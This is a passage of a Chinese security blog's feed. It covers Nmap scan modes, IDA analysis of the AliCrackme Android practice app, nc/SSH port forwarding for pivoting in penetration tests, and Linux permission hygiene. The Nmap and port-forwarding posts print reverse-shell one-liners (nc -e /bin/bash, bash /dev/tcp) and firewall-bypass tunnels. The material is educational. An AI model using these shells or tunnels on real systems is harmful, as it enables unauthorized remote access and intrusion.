192.168.31.1</span><br><span class="line"><span class="meta">#</span><span class="bash"> SYN扫描（-sS）：该选项也称为半开连接或者SYN stealth。采用该选项后，Nmap将使用 含有SYN标志位的数据包进行端口探测。如果目标主机回复了SYN/ACK包，则说明该端口处 于开放状态：如果回复的是RST/ACK包，则说明这个端口处于关闭状态；如果没有任何响应 或者发送了ICMP unreachable信息，则可认为这个端口被屏蔽了。SYN模式的扫描速度非常 好。而且由于这种模式不会进行三次握手，所以是一种十分隐蔽的扫描方式</span></span><br><span class="line"></span><br><span class="line">namp -sN 192.168.31.1</span><br><span class="line">namp -sF 192.168.31.1</span><br><span class="line"><span class="meta">#</span><span class="bash">TCP NULL（-sN）、FIN（-sF）及XMAS（-sX）扫描：NULL 扫描不设置任何控制位； FIN扫描仅设置FIN标志位：XMAS扫描设置FIN、PSH和URG的标识位。如果目标主机返回 了含有RST标识位的响应数据，则说明该端口处于关闭状态；如果目标主机没有任何回应， 则该端口处于打开｜过滤状态。</span></span><br><span class="line"></span><br><span class="line">-O x.x.x.x #检测目标主机系统</span><br></pre></td></tr></table></figure><h3 id="UDP扫描"><a href="#UDP扫描" class="headerlink" title="UDP扫描"></a>UDP扫描</h3><p><code>nmap -sU 192.168.1.1</code> <br><br>Nmap的UDP扫描仅有一种扫描方式（-sU）。虽然UDP扫描结果没有 TCP扫描结果的可靠度高，但渗透测试人员不能因此而轻视UDP扫描，毕竟UDP端口代表着可能会有价值的服务端程序。但是UDP扫描的最大问题是性能问题。由干Linux内核限制1秒内最多发送一次ICMP Port Unreachable信息。按照这个速度，对一台主机的65536个UDP端口进行完整扫描，总耗时必定会超过18个小时。</p><p><strong>UDP扫描原理：</strong></p><p>向目标主机的UDP端口发送探测包，如果收到回复“ ICMP port unreachable ”就说明该端口是关闭的；如果没有收到回复，那说明UDP端口可能是开放的或屏蔽的</p><p>优化方法主要是:</p><ol><li>进行并发的UDP扫描；</li><li>优先扫描常用端口；</li><li>在防火墙后面扫描；</li><li>启用–host-timeout选项以跳过响应过慢的主机。</li></ol><p>假如我们需要找到目标主机开放了哪些 UDP端口。为提高扫描速度，我们仅扫描 53端口 （DNS）和161端口（SNMP）</p><p>使用命令  <code>nmap -sU 192.168.56.103 -p 53,161</code></p><h3 id="目标端口选项"><a href="#目标端口选项" class="headerlink" title="目标端口选项"></a>目标端口选项</h3><p>默认情况下，Nmap将从每个协议的常用端口中随机选择1000个端口进行扫描。其nmapservices文件对端口的命中率进行了排名。</p><figure class="highlight shell"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br></pre></td><td class="code"><pre><span class="line">-p端口范围：只扫描指定的端口。扫描1〜1024号端口，可设定该选项为–p1-1024。扫描1 〜65535端口时，可使用-p-选项。</span><br><span class="line"></span><br><span class="line">-F（快速扫描）：将仅扫描100个常用端口。</span><br><span class="line"></span><br><span class="line">-r（顺序扫描）：指定这个选项后，程序将从按照从小到大的顺序扫描端口。</span><br><span class="line"></span><br><span class="line">-top-ports &lt;1 or=&quot;&quot;greater=&quot;&quot;&gt;：扫描nmap-services里排名前N的端口。</span><br></pre></td></tr></table></figure><p>Nmap还提供了脚本引擎功能（Nmap Scripting Engine，NSE）</p><figure class="highlight shell"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><span class="line">nmap -p1-65000 -sV 192.168.1.1</span><br><span class="line"><span class="meta">#</span><span class="bash">扫描目标ip的1-65000端口，并进行服务版本识别</span></span><br></pre></td></tr></table></figure><h3 id="NC"><a href="#NC" class="headerlink" title="NC"></a>NC</h3><p>由于Nmap中提供了Ncat功能，Ncat包含NetCat的所有功能</p><figure class="highlight shell"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br></pre></td><td class="code"><pre><span class="line">nc -l -p 80       #监听本机的TCP80端口</span><br><span class="line">nc -nvv 192.168.x.x 80    #连到192.168.x.x的TCP80端口</span><br><span class="line"></span><br><span class="line">nc -e /bin/bash 192.168.0.1 33</span><br><span class="line"><span class="meta">#</span><span class="bash"> 绑定到192.168.0.1的33端口，并反弹一个自己的shell到远程主机</span></span><br><span class="line"></span><br></pre></td></tr></table></figure>]]></content>
    
    
      
      
    <summary type="html">&lt;h2 id=&quot;Nmap&quot;&gt;&lt;a href=&quot;#Nmap&quot; class=&quot;headerlink&quot; title=&quot;Nmap&quot;&gt;&lt;/a&gt;Nmap&lt;/h2&gt;&lt;p&gt;Nmap是被专业人员广泛使用的一款功能全面的端口扫描工具&lt;/p&gt;
&lt;h3 id=&quot;安装&quot;&gt;&lt;a href=&quot;#安装&quot; cla</summary>
      
    
    
    
    
    <category term="web安全" scheme="http://yejuns.github.io/tags/web%E5%AE%89%E5%85%A8/"/>
    
  </entry>
  
  <entry>
    <title>Android逆向第七课 - IDA静态分析</title>
    <link href="http://yejuns.github.io/2021/02/18/Android%E9%80%86%E5%90%91%E7%AC%AC%E4%B8%83%E8%AF%BE/"/>
    <id>http://yejuns.github.io/2021/02/18/Android%E9%80%86%E5%90%91%E7%AC%AC%E4%B8%83%E8%AF%BE/</id>
    <published>2021-02-18T11:01:51.000Z</published>
    <updated>2021-08-11T01:20:15.789Z</updated>
    
    <content type="html"><![CDATA[<h2 id="ida介绍"><a href="#ida介绍" class="headerlink" title="ida介绍"></a>ida介绍</h2><p>ida是一款非常强大的静态分析工具，广泛用于病毒分析，ctf（re pwn）,软件破解，二进制漏洞分析，算法分析等。ida可以分析的文件格式也非常多 包括windows下的pe格式文件（.exe .dll .sys）linux 下的elf文件（.elf .so ）mac系统的常见文件格式，以及一些不常见到系统的文件格式。<br>对于一般的无壳保护，无混淆代码的程序 ida 能直接反汇编出位代码（F5快捷键），在一定程度上减少了逆向分析的难度和门槛。</p><h3 id="ida-使用"><a href="#ida-使用" class="headerlink" title="ida 使用"></a>ida 使用</h3><p>在我们安装成功后，会出现两个 ida 的图标，一个是 <code>ida 32</code>,一个是 <code>ida 64</code>。这里的32和64是指我们进行分析的二进制文件，选择32-bit IDA分析32位程序，64-bit IDA 分析64位程序。（一般手机app中的 so文件都是32位）</p><p><img src="https://raw.githubusercontent.com/yejuns/imgs/main/android/ida-1.png"></p><p>我们用 ida 打开一个文件，界面上出现的选项是 ida 自动分析的结果，不用更改，直接ok打开就好</p><p><img src="https://raw.githubusercontent.com/yejuns/imgs/main/android/ida-2.png"></p><p>ida的各个功能比较多，我这里只介绍一些常用的。选择view下的<code>open subview</code></p><p><img src="https://raw.githubusercontent.com/yejuns/imgs/main/android/ida-3.png"></p><ol><li>hex dump：直接查看程序的二进制内容（以hex值表示）一般用于直接查找存在程序中的明文字符串,或者动态调试时的内容查看</li><li>disassembly：查看程序反编译出的汇编代码（以汇编语言显示）一般用于直接分析相关函数的汇编代码，<code>按 f5 键可以把汇编代码转成 c 代码</code></li><li>Functions_wiondow:函数表（重要）用于分析每一个单独的函数，在逆向分析中往往都是直接利用 Function_windows 查找关键函数开始对整个程序进行分析，该窗口提供 ctrl+F 的搜索功能 例如可以直接 ctrl+f 定位到 main 函数。</li><li>names:符号表,包括函数名，变量名等。</li><li>strings（快捷键f12）：字符串表 包括程序中存储的字符串常量（可以用于快速定位关键函数）</li></ol><h2 id="2-实例"><a href="#2-实例" class="headerlink" title="2.实例"></a>2.实例</h2><p>我们需要使用 ida 去静态调试android应用中的 .so 文件，首先要了解 .so 文件的原理</p><h3 id="Java如何调用so库里的方法-函数"><a href="#Java如何调用so库里的方法-函数" class="headerlink" title="Java如何调用so库里的方法/函数"></a>Java如何调用so库里的方法/函数</h3><p>JNI是Java Native Interface的缩写，用java调用.so 库就是JNI</p><figure class="highlight java"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br></pre></td><td class="code"><pre><span class="line"><span class="comment">//在Java中申明一个Native方法</span></span><br><span class="line"> <span class="function"><span class="keyword">public</span> <span class="keyword">static</span> <span class="keyword">native</span> String <span class="title">securityCheck</span><span class="params">(Context context,String str)</span></span>;</span><br><span class="line"></span><br><span class="line"> <span class="comment">//用System.loadLibrary()加载so库, so库的全称是 libnative-lib.so</span></span><br><span class="line"> <span class="keyword">static</span> &#123;</span><br><span class="line">    System.loadLibrary(<span class="string">&quot;native-lib&quot;</span>);</span><br><span class="line"> &#125;</span><br></pre></td></tr></table></figure><h3 id="2-1-手动注册"><a href="#2-1-手动注册" class="headerlink" title="2.1 手动注册"></a>2.1 手动注册</h3><p> 默认情况下，注册native方法的规则是，<code>Java_类名_方法名()</code>,比如类名是 <code>MainActivity</code>,方法名是<code>securityCheck</code>,那么在 so 文件中对应的方法名就是 <code>Java_com_yaotong_crackme_MainActivity_securityCheck()</code>。</p><p> 但为了防止分析人员进行分析，有些开发者会使用 <code>手动注册native方法</code> 的方式改写对应关系，也就是在 <code>JNI_OnLoad</code>中进行改写。这时候我们就无法在 so 文件中找到对应的方法。如果想要找到这个方法，就用通过<code>JNI_OnLoad</code>去确定。</p><h3 id="2-2-System-loadLibrary-加载so文件流程"><a href="#2-2-System-loadLibrary-加载so文件流程" class="headerlink" title="2.2 System.loadLibrary()加载so文件流程"></a>2.2 System.loadLibrary()加载so文件流程</h3><ol><li>先读取so文件的.init_array段</li><li>再执行JNI_OnLoad函数</li><li>JNI_ONLoad是.so文件的初始函数</li><li>然后调用具体的native方法</li></ol><h3 id="2-3-静态调试-so-文件"><a href="#2-3-静态调试-so-文件" class="headerlink" title="2.3 静态调试 so 文件"></a>2.3 静态调试 so 文件</h3><p>我们选择阿里提供的<code>AliCrackme.apk</code>进行测试。打开app，可以看到就是一个简单的过密码问题。</p><p><img src="https://raw.githubusercontent.com/yejuns/imgs/main/android/ida-5.png"></p><p>首先使用 jadx 打开查看，加密的方法名是<code>securityCheck</code>，分析源码可知加密部分是通过so文件进行的，因此我们需要导出 so 文件，然后用 ida 打开</p><p><img src="https://raw.githubusercontent.com/yejuns/imgs/main/android/ida-4.png"></p><p>在 Functions_wiondow 窗口中通过 Ctrl+F 找出目标方法 <code>Java_com_yaotong_crackme_MainActivity_securityCheck()</code>，然后将汇编代码转成 c语言代码，</p><figure class="highlight c++"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br></pre></td><td class="code"><pre><span class="line"><span class="function"><span class="keyword">int</span> __fastcall <span class="title">Java_com_yaotong_crackme_MainActivity_securityCheck</span><span class="params">(<span class="keyword">int</span> a1, <span class="keyword">int</span> a2, <span class="keyword">int</span> a3)</span></span></span><br><span class="line"><span class="function"></span>&#123;</span><br><span class="line">  <span class="keyword">unsigned</span> __int8 *v5; <span class="comment">// r0</span></span><br><span class="line">  <span class="keyword">char</span> *v6; <span class="comment">// r2</span></span><br><span class="line">  <span class="keyword">int</span> v7; <span class="comment">// r3</span></span><br><span class="line">  <span class="keyword">int</span> v8; <span class="comment">// r1</span></span><br><span class="line"></span><br><span class="line">  <span class="keyword">if</span> ( !byte_6359 )</span><br><span class="line">  &#123;</span><br><span class="line">    sub_2494(byte_6304, <span class="number">8</span>, &amp;unk_446B, &amp;unk_4468, <span class="number">2</span>, <span class="number">7</span>);</span><br><span class="line">    byte_6359 = <span class="number">1</span>;</span><br><span class="line">  &#125;</span><br><span class="line">  <span class="keyword">if</span> ( !byte_635A )</span><br><span class="line">  &#123;</span><br><span class="line">    sub_24F4(byte_636C, <span class="number">25</span>, &amp;unk_4530, &amp;unk_4474, <span class="number">3</span>, <span class="number">117</span>);</span><br><span class="line">    byte_635A = <span class="number">1</span>;</span><br><span class="line">  &#125;</span><br><span class="line">  _android_log_print(<span class="number">4</span>, byte_6304, byte_636C);</span><br><span class="line">  v5 = (<span class="keyword">unsigned</span> __int8 *)(*(<span class="keyword">int</span> (__fastcall **)(<span class="keyword">int</span>, <span class="keyword">int</span>, _DWORD))(*(_DWORD *)a1 + <span class="number">676</span>))(a1, a3, <span class="number">0</span>);</span><br><span class="line">  v6 = off_628C;</span><br><span class="line">  <span class="keyword">while</span> ( <span class="number">1</span> )</span><br><span class="line">  &#123;</span><br><span class="line">    v7 = (<span class="keyword">unsigned</span> __int8)*v6;</span><br><span class="line">    <span class="keyword">if</span> ( v7 != *v5 )</span><br><span class="line">      <span class="keyword">break</span>;</span><br><span class="line">    ++v6;</span><br><span class="line">    ++v5;</span><br><span class="line">    v8 = <span class="number">1</span>;</span><br><span class="line">    <span class="keyword">if</span> ( !v7 )</span><br><span class="line">      <span class="keyword">return</span> v8;</span><br><span class="line">  &#125;</span><br><span class="line">  <span class="keyword">return</span> <span class="number">0</span>;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure><p>我们可以看到有一个很重要的地方 <code>(unsigned __int8 *)(*(int (__fastcall **)(int, int, _DWORD))(*(_DWORD *)a1 + 676))(a1, a3, 0);</code>这个地方说明 c 程序调用了 java 方法（a1 + 676 前面是一个指针，表示 a1 是<code>JNIEnv*</code>类型），所以可以将JNI函数方法还原。选中 <code>a1</code> 按 y 键进行类型替换，替换类型为 <code>JNIEnv*</code> ,就可以看到对应的真实方法。</p><p>最后，可以确定密码是在 <code>off_628C</code>。我们双击<code>off_628C</code>常量，最后会找到一个字符串（这个字符串也可以通过 <code>shift+F12</code> 找出）。</p><h3 id="静态调试的一些技巧"><a href="#静态调试的一些技巧" class="headerlink" title="静态调试的一些技巧"></a>静态调试的一些技巧</h3><ul><li>面板左侧函数列表可以查看每个函数的偏移量（相较于.so文件头的偏移量）</li><li>F5键（windows fn+F5） 把汇编代码转成C代码</li><li>shift+F12 查看so文件中所有常量字符串的值 有的密码之类的可能就在这里面</li><li>ctrl + s 查看so文件段信息</li><li>JNI函数方法名还原 选中v3 按y建 作用（类型还原）</li><li>变量重命名 代码加注解</li></ul><p>参考文献</p><blockquote><p><a href="https://tech.youzan.com/qian-tan-android-dexwen-jian/">https://tech.youzan.com/qian-tan-android-dexwen-jian/</a></p></blockquote>]]></content>
    
    
      
      
    <summary type="html">&lt;h2 id=&quot;ida介绍&quot;&gt;&lt;a href=&quot;#ida介绍&quot; class=&quot;headerlink&quot; title=&quot;ida介绍&quot;&gt;&lt;/a&gt;ida介绍&lt;/h2&gt;&lt;p&gt;ida是一款非常强大的静态分析工具，广泛用于病毒分析，ctf（re pwn）,软件破解，二进制漏洞分析，算法分析等。</summary>
      
    
    
    
    
    <category term="Android逆向" scheme="http://yejuns.github.io/tags/Android%E9%80%86%E5%90%91/"/>
    
  </entry>
  
  <entry>
    <title>渗透之端口转发</title>
    <link href="http://yejuns.github.io/2021/01/22/%E6%B8%97%E9%80%8F%E4%B9%8B%E7%AB%AF%E5%8F%A3%E8%BD%AC%E5%8F%91/"/>
    <id>http://yejuns.github.io/2021/01/22/%E6%B8%97%E9%80%8F%E4%B9%8B%E7%AB%AF%E5%8F%A3%E8%BD%AC%E5%8F%91/</id>
    <published>2021-01-22T08:01:51.000Z</published>
    <updated>2021-08-08T03:00:43.702Z</updated>
    
    <content type="html"><![CDATA[<h2 id="端口转发"><a href="#端口转发" class="headerlink" title="端口转发"></a>端口转发</h2><p>在渗透测试过程中，我们经常会用到端口转发，利用代理脚本将内网的流量代理到本地进行访问，方便对内网进行横向渗透。端口转发可以很好的解决下列问题：</p><ol><li>对于防火墙禁止访问某些端口的问题，比如3389端口，我们可以将利用机器的3000端口做端口转发，从外界接受数据，转发给本机的3389端口，从而绕过防火墙</li><li>对于无法访问内网特定机器的问题，我们可以先抓取内网一台机器，然后利用这台机器进行端口转发，接受外网的数据，将数据转发到内网目标机器的特定端口</li></ol><p>常用的方法有</p><p><code>nc、lcx、socks、bash反弹、MSF后门反弹、frp</code></p><h2 id="nc端口转发"><a href="#nc端口转发" class="headerlink" title="nc端口转发"></a>nc端口转发</h2><p>背景：192.168.50.1的用户ye需要访问192.168.50.2的8000端口，但是该端口被防火墙保护着，不允许外界机器访问。目前ye用户只能访问192.168.50.2的9000端口。需要9000端口做转发。 </p><ol><li>在192.168.50.2上开启8000端口<br><code>nc -l 8000</code></li><li>在192.168.50.2上实现9000端口转发<br><code>cat /tmp/fifo | nc localhost 8000 | nc -l 9000 &gt; /tmp/fifo</code></li><li>在192.168.50.1上连接192.168.50.2的9000端口<br><code>nc -vn 192.168.50.2 9000</code></li></ol><h2 id="Shell命令实现端口转发"><a href="#Shell命令实现端口转发" class="headerlink" title="Shell命令实现端口转发"></a>Shell命令实现端口转发</h2><ol><li>部分linux发行版中的Bash可以直接反弹一个shell到指定ip端口 <figure class="highlight shell"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">bash -i &gt;&amp; /dev/tcp/x.x.x.x/2333 0&gt;&amp;1</span><br></pre></td></tr></table></figure></li><li><figure class="highlight shell"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br></pre></td><td class="code"><pre><span class="line">ssh -CfNg -L 9987:10.154.62.197:3306 root@localhost </span><br><span class="line"><span class="meta">#</span><span class="bash"> 9987是本地创建的一个端口要把10.154.62.197服务器上的3306端口映射到本地的9987</span></span><br><span class="line">ssh -CfNg -R 1521:127.0.0.1:6300 root@localhost</span><br><span class="line"><span class="meta">#</span><span class="bash"> 作用同上, 只是在远程主机172.16.1.164上打开1521端口, 来映射本机的6300端口.</span></span><br></pre></td></tr></table></figure>案例：有A,B,C 3台服务器, A,C有公网IP, B是某IDC的服务器无公网IP. A通过B连接C的80端口(A&lt;=&gt;B&lt;=&gt;C), 那么在B上执行如下命令即可:</li></ol><figure class="highlight shell"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br></pre></td><td class="code"><pre><span class="line">ssh -CfNg -L 6300:127.0.0.1:80 userc@C</span><br><span class="line"></span><br><span class="line">ssh -CfNg -R 80:127.0.0.1:6300 usera@A</span><br></pre></td></tr></table></figure><p>服务器A和服务器C之间, 利用跳板服务器B建立了加密隧道. 在A上连接127.0.0.1:80, 就等同C上的80端口. 需要注意的是, 服务器B上的6300端口的数据没有加密, 可被监听, 例:</p><figure class="highlight shell"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">tcpdump -s 0 -i lo port 6300</span><br></pre></td></tr></table></figure>]]></content>
    
    
      
      
    <summary type="html">&lt;h2 id=&quot;端口转发&quot;&gt;&lt;a href=&quot;#端口转发&quot; class=&quot;headerlink&quot; title=&quot;端口转发&quot;&gt;&lt;/a&gt;端口转发&lt;/h2&gt;&lt;p&gt;在渗透测试过程中，我们经常会用到端口转发，利用代理脚本将内网的流量代理到本地进行访问，方便对内网进行横向渗透。端口转发可以很</summary>
      
    
    
    
    
    <category term="渗透" scheme="http://yejuns.github.io/tags/%E6%B8%97%E9%80%8F/"/>
    
  </entry>
  
  <entry>
    <title>Linux 中的安全模型</title>
    <link href="http://yejuns.github.io/2020/12/31/Linux%20%E4%B8%AD%E7%9A%84%E5%AE%89%E5%85%A8%E6%A8%A1%E5%9E%8B/"/>
    <id>http://yejuns.github.io/2020/12/31/Linux%20%E4%B8%AD%E7%9A%84%E5%AE%89%E5%85%A8%E6%A8%A1%E5%9E%8B/</id>
    <published>2020-12-31T08:01:51.000Z</published>
    <updated>2021-07-05T05:48:45.271Z</updated>
    
    <content type="html"><![CDATA[<h2 id="Linux-的构成"><a href="#Linux-的构成" class="headerlink" title="Linux 的构成"></a>Linux 的构成</h2><p>Linux 可以分为<code>内核层</code>和<code>用户层</code>。用户层通过内核层提供的操作接口，来执行各类任务</p><p>内核层提供的<code>权限划分、进程隔离和内存保护</code>的安全功能，是用户层的安全基础。一旦内核 安全被突破（比如黑客能够修改内核逻辑），黑客就可以任意地变更权限、操作进程和获取内存。</p><p>但作为使用者，对于内核层我们只需要按照插件漏洞的防护方法，确保使用官方的镜像并保持更新。我们需要关注的是用户层的安全。</p><h2 id="用户层安全"><a href="#用户层安全" class="headerlink" title="用户层安全"></a>用户层安全</h2><p>在 Linux 中，用户层的所有操作，都可以抽象为<code>“主体 -&gt; 请求 -&gt; 客体”</code>这么一个流程。 比如，“打开 /etc/passwd”这一操作的主体是实际的用户，请求是读，客体是 /etc/passwd 这个文件。</p><p><img src="https://raw.githubusercontent.com/yejuns/imgs/main/essay/linux_1.jpg" alt="linux安全"></p><p>在这个过程中，Linux 内核安全提供了基于权限的访问控制，确保数据不被其他操作获取。<br>Linux 用户层则需要确保权限的正确配置</p><h3 id="Linux中的认证机制"><a href="#Linux中的认证机制" class="headerlink" title="Linux中的认证机制"></a>Linux中的认证机制</h3><p>Linux是一个多用户操作系统，它通过普通的文本文件来保存和管理用户信息。这其中，有 2个比较关键的文件：<code>/etc/passwd</code>和<code>/etc/shadow</code></p><p><code>/etc/passwd</code>是全局可读的，不具备保密性。因此，<code>/etc/passwd</code>不会直接存储密码，而是用x来进行占位。那实际的用户密码信息，就会存储到仅ROOT可读的<code>/etc/shadow</code>中。</p><p>在<code>/etc/shadow</code>中，除了加密后的密码，也保存了诸如密码有效天数、失效多少天告警之类的密码管理策略。我们可以通过Chage 命令来对密码管理策略进行修改,如</p><figure class="highlight shell"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><span class="line">chage -M 60 ye</span><br><span class="line"><span class="meta">#</span><span class="bash"> 强制用户ye在 60 天内必须对密码进行修改</span></span><br></pre></td></tr></table></figure><p>因为认证这个功能是由Linux内核来提供的，所以在用户层，我们需要关心的,就是弱密码导致的身份信息泄漏。为了解决这个问题，在/etc/shadow中，我们可以制定适当的密码策略。除此之外，我们也可以通过使用已知的弱密码库，来对 Linux 中的弱密码进行检测</p><h3 id="Linux-中的授权机制"><a href="#Linux-中的授权机制" class="headerlink" title="Linux 中的授权机制"></a>Linux 中的授权机制</h3><p>Linux对目录和文件除了<code>r,w,x</code>3种权限外，还提供了一些额外的权限标签，来进行更细粒度地权限控制</p><p>Linux 提供了文件属性的概念，来对文件设置更多的保护。通过<code>chattr +i /etc/passwd</code>可以防止文件被任何用户修改</p><p>Linux 还提供了“粘滞位”的功能，主要用来防止用户随意操作其他用户的文件。比如<br><code>chmod +t /tmp</code>可以阻止删除/tmp目录下其他用户的文件</p><p><code>要解决权限问题，我们就要实践最小权限原则。</code></p><p>Linux中最普遍的问题，就是滥用<code>Root</code>，很多人在登录 Linux 系统后，第一个命令就是通过 su 来获取 ROOT 的 Shell 环境</p><p>但是，在 ROOT 的 Shell 环境中，启动的所有进程也都具备<code>ROOT</code>权限。如果启动的是一个立即返回的进程，如<code>CAT</code>,不会有太多问题，但如果是一个长期 运行的进程，就很容易产生权限的滥用。 比如，当你以<code>ROOT</code>的身份启动<code>Redis</code>或者 <code>MySQL</code> 时，如果这时有其他用户 连入 Redis 或者 MySQL，那他们也能间接地获取 ROOT 的权限。在大部分服务器入侵的场景中，黑客都是通过这些具备 ROOT 权限的进程漏洞，来实现权限提升的。</p><p>谨记“最小权限”原则。也就是说，我们根据要执行的操作等级，配置“最小权限”来启动常驻进程。比如，如果只是在 Redis 和 MySQL 这样的数据库中进行文件读写操作，根本不需要 ROOT 这种最高等级的权限。</p><p>我们不需要自己去配置这些权限，而是常常使用一些已知的工具，来实现“最小权限”启动长驻进程的功能。</p><p>比如说，我们可以通过 mysqld 启动 MySQL 服务时，mysqld 会将 MySQL 的进程分配到“mysql”这个用户，并在 ROOT下建立<code>守护进程</code>(可以理解为服务)。</p><p>类似的，当启动 Nginx 时，Nginx 会将 Worker 节点以 nobody 的用户身份来执行。</p>]]></content>
    
    
      
      
    <summary type="html">&lt;h2 id=&quot;Linux-的构成&quot;&gt;&lt;a href=&quot;#Linux-的构成&quot; class=&quot;headerlink&quot; title=&quot;Linux 的构成&quot;&gt;&lt;/a&gt;Linux 的构成&lt;/h2&gt;&lt;p&gt;Linux 可以分为&lt;code&gt;内核层&lt;/code&gt;和&lt;code&gt;用户层&lt;/code</summary>
      
    
    
    
    
    <category term="Linux安全" scheme="http://yejuns.github.io/tags/Linux%E5%AE%89%E5%85%A8/"/>
    
  </entry>
  
</feed>
